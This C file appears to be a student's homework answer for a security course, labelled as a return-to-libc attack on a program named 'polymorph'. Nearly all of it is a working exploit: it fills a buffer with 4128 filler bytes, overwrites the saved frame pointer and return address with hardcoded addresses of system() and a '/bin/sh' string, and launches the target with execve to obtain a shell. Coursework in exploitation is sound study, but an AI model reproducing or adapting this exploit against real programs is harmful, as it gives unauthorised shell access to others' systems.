/*

Name: Vishruta Rudresh
Andrew ID: vrudresh
Question: 2.2 
Type: return-to-lib                        

*/

/* Defining header files */
#include<stdio.h>


int main()
{
    char attack_string[4152];
    char *argv[]={"./polymorph","-f",attack_string,NULL};
    int i,j;
    for(i=0;i<4128;i++)
        attack_string[i]='v';
  
    /* EBP value */ 
    attack_string[i++]=157;
    attack_string[i++]=134;
    attack_string[i++]=4;
    attack_string[i++]=8;

    attack_string[i++]=128;
    attack_string[i++]=209;
    attack_string[i++]=4;
    attack_string[i++]=8;


    /* system address */
    attack_string[i++]=96;
    attack_string[i++]=33;
    attack_string[i++]=228;
    attack_string[i++]=183;

    /* Dummy string */
    attack_string[i++]=1;
    attack_string[i++]=1;
    attack_string[i++]=1;
    attack_string[i++]=1;

    /* Address to /bin/sh */
    attack_string[i++]=180;
    attack_string[i++]=225;
    attack_string[i++]=4;
    attack_string[i++]=8;

    
    attack_string[i++]='s';
    attack_string[i++]='h';
    attack_string[i++]='\0';

    j=execve("./polymorph",argv,NULL);


}
